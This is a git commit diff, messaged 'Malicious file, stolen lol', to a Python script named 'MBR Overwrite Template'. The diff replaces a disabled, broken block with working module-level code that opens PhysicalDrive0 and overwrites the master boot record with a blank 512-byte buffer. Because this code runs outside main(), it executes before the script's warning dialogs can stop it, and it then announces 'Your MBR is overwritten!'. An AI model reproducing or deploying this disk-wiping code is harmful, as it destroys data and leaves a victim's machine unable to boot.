efc4b35f135ebf5f03cb50754635653ce7a25bec
ST5Sneaky <105569073+ST5Sneaky@users.noreply.github.com>
2022-08-23 16:53:57 -0400

    Malicious file, stolen lol

--- servers/windows_sandbox/MBR Overwrite Template.py
+++ servers/windows_sandbox/MBR Overwrite Template.py
@@ -10,18 +10,10 @@ def main():
     if MessageBox("If you read the previous warning and have a virtual machine ready, up and running, like Windows Sandbox, VirtualBox or VMware Player, or VMware Workstation is all safe enviroments to run this. THIS IS THE LAST WARNING BEFORE RUNNING.", "Warning, AGAIN!", MB_ICONWARNING | MB_YESNO) == 7: # no
         return
 # starts overwriting mbr
-    if False:
-        hDevice = CreateFileW("\\\\.\\PhysichalDrive0"
-                                 GENERIC_WRITE,
-                                 FILE_SHARE_READ | FILE_SHARE_WRITE
-                                 None,
-                                 OPEN_EXISTING,
-                                 0,0
-                                 )
-        WriteFile(hDevice
-                                 AllocateReadBuffer(512) # python bufferer
-                                 None # NONE 
-                                 ) # finale
-        CloseHandle(hDevice) # clear memory
+hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
+WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
+CloseHandle(hDevice) # Close the handle to our Physical Drive!
+
+MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)
 
 main()
